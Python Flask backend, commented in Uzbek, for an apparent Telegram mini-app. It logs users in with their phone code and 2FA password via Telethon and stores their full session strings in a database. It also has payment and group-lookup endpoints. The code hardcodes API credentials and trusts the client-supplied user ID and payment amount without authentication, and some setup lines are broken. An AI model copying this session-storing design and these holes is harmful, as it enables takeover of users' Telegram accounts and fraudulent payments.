import os
import asyncio
import re
from flask import Flask, request, jsonify, render_template

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    FloodWaitError
)
from database import (
    save_login_attempt,
    get_login_attempt,
    delete_login_attempt,
    save_user,
    save_user_session
)
from database import (
    get_user_groups,
    add_user_group,
    remove_user_group
)
from telethon.tl.types import Chat, Channel
from telethon.errors import SessionRevokedError
from database import get_db, get_temp_groups_from_db


# =====================
# CONFIG
# =====================
API_ID = 34188035
API_HASH = "2f39ded3e260910e54b48b00a264f19c"

# =====================
# ASYNC LOOP (BITTA!)
# =====================
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def run(coro):
    return loop.run_until_complete(coro)

# =====================
# FLASK APP — SHART!
# =====================
app = Flask(__name__, template_folder="templates")
app = Flask(__name__, static_folder="static")


# =====================
# INIT DB (FAQAT AGAR KERAK BO‘LSA)
# =====================
if os.getenv("RUN_INIT_DB") == "1":
    init_db()

# =====================
# ASYNC HELPER
# =====================
# HELPERS
# =====================
def clean_phone(phone: str) -> str:
    phone = re.sub(r"\D", "", phone)
    if not phone.startswith("998") or len(phone) != 12:
        raise ValueError("Telefon formati noto‘g‘ri")
    return "+" + phone

# =====================
# ROUTES
# =====================
@app.route("/")
def index():
    return render_template("landing.html")

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

@app.route("/send_code", methods=["POST"])
def send_code():
    try:
        data = request.json or {}
        phone_raw = data.get("phone")

        if not phone_raw:
            return jsonify({"status": "error"}), 400

        phone = clean_phone(phone_raw)

        async def _send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()

            if await client.is_user_authorized():
                await client.log_out()

            sent = await client.send_code_request(phone, force_sms=True)
            print("SEND_CODE DEBUG:", sent)

            save_login_attempt(
                phone=phone,
                phone_code_hash=sent.phone_code_hash,
                session_string=client.session.save()
            )

            await client.disconnect()

        run(_send_code())
        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print("SEND_CODE ERROR:", repr(e))
        return jsonify({"status": "error"}), 500

# =====================
# VERIFY CODE
# =====================
@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json or {}
    phone_raw = data.get("phone")
    code = data.get("code")

    if not phone_raw or not code:
        return jsonify({"status": "error"}), 400

    try:
        phone = clean_phone(phone_raw)
        attempt = get_login_attempt(phone)

        if not attempt:
            return jsonify({
                "status": "error",
                "message": "Kod muddati o‘tgan"
            }), 400

        phone_code_hash, session_string = attempt

        async def _verify():
            client = TelegramClient(
                StringSession(session_string),
                API_ID,
                API_HASH
            )
            await client.connect()

            try:
                await client.sign_in(
                    phone=phone,
                    code=code,
                    phone_code_hash=phone_code_hash
                )
            except SessionPasswordNeededError:
                return None, client.session.save()

            user = await client.get_me()
            final_session = client.session.save()
            return user, final_session

        user, final_session = run(_verify())

        # ===== 2FA =====
        if user is None:
            return jsonify({"status": "2fa_required"}), 200

        save_user_session(user.id, final_session)
        save_user(user.id, phone, user.username)
        delete_login_attempt(phone)

        return jsonify({"status": "ok"}), 200

    except PhoneCodeInvalidError:
        return jsonify({
            "status": "error",
            "message": "Kod noto‘g‘ri"
        }), 400

    except Exception as e:
        print("VERIFY_CODE ERROR:", repr(e))
        return jsonify({"status": "error"}), 500

# =====================
# VERIFY PASSWORD (2FA)
# =====================
@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json or {}
    phone_raw = data.get("phone")
    password = data.get("password")

    if not phone_raw or not password:
        return jsonify({"status": "error"}), 400

    try:
        phone = clean_phone(phone_raw)
        attempt = get_login_attempt(phone)

        if not attempt:
            return jsonify({"status": "error"}), 400

        _, session_string = attempt

        async def _verify_password():
            client = TelegramClient(
                StringSession(session_string),
                API_ID,
                API_HASH
            )
            await client.connect()

            await client.sign_in(password=password)
            user = await client.get_me()
            final_session = client.session.save()
            return user, final_session

        user, final_session = run(_verify_password())

        save_user_session(user.id, final_session)
        save_user(user.id, phone, user.username)
        delete_login_attempt(phone)

        return jsonify({"status": "ok"}), 200

    except PasswordHashInvalidError:
        return jsonify({
            "status": "error",
            "message": "Parol noto‘g‘ri"
        }), 400

    except Exception as e:
        print("VERIFY_PASSWORD ERROR:", repr(e))
        return jsonify({"status": "error"}), 500


from flask import request, jsonify
from database import get_db

@app.route("/api/payment/init", methods=["POST"])
def init_payment():
    data = request.json

    user_id = data["user_id"]
    months = data["months"]
    amount = data["amount"]

    # tariff nomini yasaymiz
    tariff = f"{months}_month"

    conn = get_db()
    cur = conn.cursor()

    cur.execute("""
        INSERT INTO payments (user_id, tariff, price, months, status)
        VALUES (%s, %s, %s, %s, 'pending')
    """, (user_id, tariff, amount, months))

    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})

from flask import request, jsonify
from database import get_temp_groups_from_db

@app.route("/api/temp-groups", methods=["GET"])
def api_temp_groups():
    user_id = request.args.get("user_id", type=int)
    if not user_id:
        return jsonify([])

    groups = get_temp_groups_from_db(user_id)
    return jsonify(groups)

# =====================
# RUN
# =====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
